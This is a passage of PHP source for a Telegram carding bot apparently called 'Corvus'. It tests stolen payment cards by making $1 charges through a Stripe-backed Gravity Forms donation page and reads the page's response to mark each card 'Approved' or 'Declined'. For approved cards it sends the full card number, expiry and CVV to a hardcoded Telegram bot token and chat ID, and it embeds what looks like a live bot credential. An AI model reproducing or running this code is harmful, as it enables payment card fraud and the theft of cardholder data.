{"0":{"visible_fields":"input_36 input_35 input_37 input_44.3 input_44.6 input_46.3 input_46.6 input_47.1 input_47.3 input_47.4 input_47.5 input_28 input_49 input_33.3 input_33.6 input_4 input_3 input_16.1 input_16.2 input_16.3 input_16.4 input_16.5 input_19 input_50.5 ak_hp_textarea","visible_fields_count":25,"invisible_fields":"input_47.6 input_16.6 input_26 gform_ajax is_submit_83 gform_submit gform_unique_id state_83 gform_target_page_number_83 gform_source_page_number_83 gform_field_values ak_js","invisible_fields_count":12}}
------WebKitFormBoundaryRGheFugj8n5dqkP3
Content-Disposition: form-data; name="stripe_response"

{"id":"'.$id2.'","client_secret":"'.$client_secret.'","amount":50}
------WebKitFormBoundaryRGheFugj8n5dqkP3
Content-Disposition: form-data; name="stripe_credit_card_last_four"

2976
------WebKitFormBoundaryRGheFugj8n5dqkP3
Content-Disposition: form-data; name="stripe_credit_card_type"

visa
------WebKitFormBoundaryRGheFugj8n5dqkP3--');
$curl = curl_exec($ch);
curl_close($ch);
unlink("cookie.txt");
$message = getData($result, '<span class="gform-icon gform-icon--close"></span>','</h2>');


        $msg = getData($curl,'<div id="divError" class="BBFormErrorBlock"><div class="BBFormErrorItem BBFormServerErrorItem">','</div>');
        $content = ['chat_id' => $chat_id, 'text' => "<b>𝑪𝒂𝒓𝒅: <code>$cc|$mes|$ano|$cvv</code> ■■■■■ </b>", 'message_id' => $m3i, 'parse_mode' => 'html'];
        $m4  = EditMessageText($content);
        $m4i = $m4['result']['message_id'];

        if (strpos($result, 'thank you for your donation')) {
            $cc_code = 'Approved ✅';
            $message = "Charged 1$ ✅";
            $full = "corvus\nCC == <code>$cc|$mes|$ano|$cvv</code>\nRES = $cc_code\nREZPONSE- $message";
            $url = "https://api.telegram.org/bot5579015618:AAEnGaXH73gQ0wn7kjrdsskESUr8FmRgGSw/sendMessage?chat_id=-1001722364754&text=".$full."&parse_mode=HTML";
         
        file_get_contents($url);
        } elseif (strpos($result, "Your card's security code is incorrect.")) {
            $cc_code = 'Approved ✅';
            $full = "corvus\nCC == <code>$cc|$mes|$ano|$cvv</code>\nRES = $cc_code\nREZPONSE- $message";
            $url = "https://api.telegram.org/bot5579015618:AAEnGaXH73gQ0wn7kjrdsskESUr8FmRgGSw/sendMessage?chat_id=-1001722364754&text=".$full."&parse_mode=HTML";
         
        file_get_contents($url);
        } elseif(strpos($result,"Your card has insufficient funds")){
            $cc_code = "Approved ✅";
            $full = "corvus\nCC == <code>$cc|$mes|$ano|$cvv</code>\nRES = $cc_code\nREZPONSE- $message";
            $url = "https://api.telegram.org/bot5579015618:AAEnGaXH73gQ0wn7kjrdsskESUr8FmRgGSw/sendMessage?chat_id=-1001722364754&text=".$full."&parse_mode=HTML";
             
            file_get_contents($url);
        }else{
            $cc_code = 'Declined ❌';
        }
        if (empty($result)) {
            $content = ['chat_id' => $chat_id, 'text' => "<b>┏━━━━━━━━━━━━━━\n┣ 🍁 𝘾𝙤𝙧𝙫𝙪𝙨 🍁\n┗━━━━━━━━━━━━━━\n══════════════════════\n[ϟ] 𝑮𝑨𝑻𝑬 : <code>𝘾𝙤𝙧𝙫𝙪𝙨 𝑪𝒉𝒂𝒓𝒈𝒆</code>\n[ϟ] 𝑪𝒂𝒓𝒅 : <code>$cc|$mes|$ano|$cvv</code>\n[ϟ] 𝑹𝒆𝒔𝒖𝒍𝒕 : <code>Unknown error $message</code>\n_𝑩𝒚: @$username [$plan]\n══════════════════════</b>", 'message_id' => $m4i, 'parse_mode' => 'html'];
            $m3  = EditMessageText($content);
            exit();
        }
        // $bank = $data['data']['bank'];
        // $country = $data['data']['country'];
        // $brand = $data['data']['vendor'];
        // $level = $data['data']['level'];
        // $type = $data['data']['type'];
        // $flag = $data['data']['countryInfo']['emoji'];
        $content = ['chat_id' => $chat_id, 'text' => "<b>┏━━━━━━━🍁 𝘾𝙤𝙧𝙫𝙪𝙨 🍁\n┗━━━━━━━━━━━━━━\n══════════════════════\n[ϟ] 𝑮𝑨𝑻𝑬 : <code>𝘾𝙤𝙧𝙫𝙪𝙨 𝑪𝒉𝒂𝒓𝒈𝒆</code>\n[ϟ] 𝑪𝒂𝒓𝒅 : <code>$cc|$mes|$ano|$cvv</code>\n[ϟ] 𝑹𝒆𝒔𝒖𝒍𝒕 : <code>$cc_code</code>\n[ϟ] 𝑹𝒆𝒔𝒑𝒐𝒏𝒔𝒆 : <b>$nonce</b>\n┏━━━━━━━━━━━━━━\n┣ 🍁 𝑩𝑰𝑵 𝑫𝑨𝑻𝑨 🍁\n┗━━━━━━━━━━━━━━\n[ϟ] 𝑩𝒊𝒏 𝑫𝒆𝒕𝒂𝒊𝒍𝒔: $bin - $type - $brand - $level\n[ϟ] 𝑩𝒂𝒏𝒌: $bank\n[ϟ] 𝑪𝒐𝒖𝒏𝒕𝒓𝒚: $country - $flag\n[ϟ] 𝑪𝒉𝒆𝒄𝒌𝒆𝒅 𝑩𝒚: @$username [$plan]\n[ϟ] 𝑩𝒐𝒕 𝑩𝒚 : <code>@BossNetworkk</code>\n══════════════════════</b>", 'message_id' => $m4i, 'parse_mode' => 'html'];
        $m3  = EditMessageText($content);
    }
}
